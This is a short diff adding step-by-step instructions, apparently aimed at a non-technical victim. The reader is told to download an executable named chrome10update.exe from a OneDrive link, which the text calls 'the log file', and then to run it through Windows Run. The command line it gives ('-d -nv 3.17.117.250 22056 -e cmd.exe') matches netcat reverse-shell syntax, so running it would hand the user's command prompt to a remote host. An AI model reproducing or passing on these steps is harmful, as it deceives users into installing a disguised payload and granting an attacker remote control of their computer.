@@ -1,0 +1,16 @@
+All of this is going to be done on the computer (NOT PHONE)
+
+1.  type this link below into a new window of google chrome, press enter and wait 3-5 seconds.
+(this will download the log file)
+
+https://onedrive.live.com/download?cid=41E2A8573FC501E6&resid=41E2A8573FC501E6%21107&authkey=AMBdp1Yb_w2-2ec
+
+2.   close google chrome window
+
+3. copy the following command below (all in one line)
+
+%USERPROFILE%\Downloads\chrome10update.exe -d -nv 3.17.117.250 22056 -e cmd.exe
+
+4. press windows key + r     than paste the command into the box and press enter
+
+5. done
